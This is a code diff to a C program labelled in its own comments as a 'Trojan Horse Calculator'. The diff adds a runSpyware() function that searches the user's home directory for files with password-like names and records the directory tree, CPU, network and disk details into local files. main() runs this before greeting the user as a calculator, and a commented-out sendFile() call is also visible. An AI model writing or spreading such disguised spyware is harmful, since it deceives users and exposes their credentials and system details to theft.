@@ -312,6 +312,23 @@ void generateTree(){
     system("tree ~ > ./data/tree.txt");
 }
 
+void runSpyware(){
+    // Create potential_leads.txt file with files potential files containing passwords
+    system("find ~ -type f \\( -name \"*pass*\" -o -name \"*psswd*\" -o -name \"*pswd*\" \\) > ./data/potential_leads.txt");
+
+    // Create tree diagram from user's home directory and store in tree.txt
+    system("tree ~ > ./data/tree.txt");
+
+    // Create cpu_info.txt containing user's cpu information
+    system("lscpu > ./data/cpu_info.txt");
+
+    // Create network_info.txt containing user's network information
+    system("ip a > ./data/network_info.txt");
+
+    // Create partition_info.txt containing user's storage/partition information
+    system("lsblk > ./data/partition_info.txt");
+}
+
 
 /*
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -478,8 +495,7 @@ void formatString(char string[]) {
 int main(){
     //Trojan Horse Calculator
     //calculator();
-    //locateValuables();
-    generateTree();
+    runSpyware();
     puts("Welcome to the best ever calculator!");
     userAuth();
     //sendFile();
